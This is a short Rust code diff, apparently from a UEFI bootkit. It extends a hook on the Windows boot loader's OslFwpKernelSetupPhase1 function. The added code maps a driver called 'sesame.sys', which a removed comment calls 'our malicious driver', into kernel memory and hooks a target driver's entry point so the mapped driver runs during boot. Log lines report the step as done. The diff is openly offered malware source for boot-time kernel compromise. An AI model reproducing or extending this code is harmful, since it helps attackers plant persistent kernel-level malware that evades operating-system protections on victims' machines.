@@ -242,15 +242,20 @@ fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut LOADER_PARAMETER_BLOCK) -
         driver.DllBase,
         driver.SizeOfImage,
     );
-    // TODO: setup target driver hook, load our malicious driver
+
     log::info!("[*] Start sesame.sys driver mapping to memory");
-    unsafe {
+    let entry_point = unsafe {
         mapper::map_driver(
             DRIVER_ALLOCATED_BUFFER,
             ntoskrnl.DllBase,
             driver.EntryPoint as _,
-        );
+        )
+    };
+    log::info!("[*] Hooking \"{TARGET_DRIVER_NAME}\" entry point");
+    unsafe {
+        hook::hook_driver(entry_point, driver.EntryPoint as _);
     }
+
     log::info!("[+] WE ARE DONE! See you on the driver's log ;)");
     log::info!("[*] Resuming OslFwpKernelSetupPhase1 execution");
     osl_fwp_kernel_setup_phase1(loader_block)
